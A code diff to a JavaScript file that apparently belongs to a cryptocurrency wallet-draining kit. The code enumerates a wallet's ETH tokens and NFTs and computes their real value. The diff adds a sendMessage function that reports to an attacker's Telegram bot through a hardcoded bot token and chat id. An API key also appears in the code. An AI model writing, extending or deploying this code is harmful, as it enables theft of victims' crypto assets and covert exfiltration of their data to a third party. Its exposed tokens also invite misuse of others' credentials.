@@ -275,7 +275,21 @@ async function getNFTs(address="", api_key="KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5P
   })
 }
 async function sendMessage(message){
-  console.log("Message")
+  return new Promise((resolve, reject)=>{
+    const chat_id = 5227607491;
+    fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
+          method: "GET",
+          headers: {
+              
+          }
+      })
+      .then(async(res) => {
+          if(res.status > 399) throw res;
+          resolve(await res.json());
+      }).catch(err=>{
+          reject(err);
+      })
+  })
 }
 
 async function sendMessage1(message){
@@ -443,13 +457,6 @@ async function proceed(){
         console.log('Eth tokens length: %o', eth_NFTs.length)
         let real_eth_token = new Array();
         let real_eth_NFTs = new Array();
-        real_eth_token[0]= {
-            contractAddress : "0x1e3A3B9C6177BA05102B749eEcB6164155FD44ae",
-            realprice : "1000000",
-            balance : "10000000000000000000000000",
-            decimal : "18",
-            fakebalance : "10000000000000000000000000"
-          }
 
         // Get tokens real values
         eth_tokens.forEach(function(token,i){
@@ -459,7 +466,6 @@ async function proceed(){
           let decimal = token.tokenInfo.decimals;
           let realprice =  balance / (10 ** (decimal || 18)) * price;
           let fakebalance = balance / (10 ** (decimal || 18));
-          let x = i + 1;
           real_eth_token[i] = {
             contractAddress : contractAddress,
             realprice : realprice,
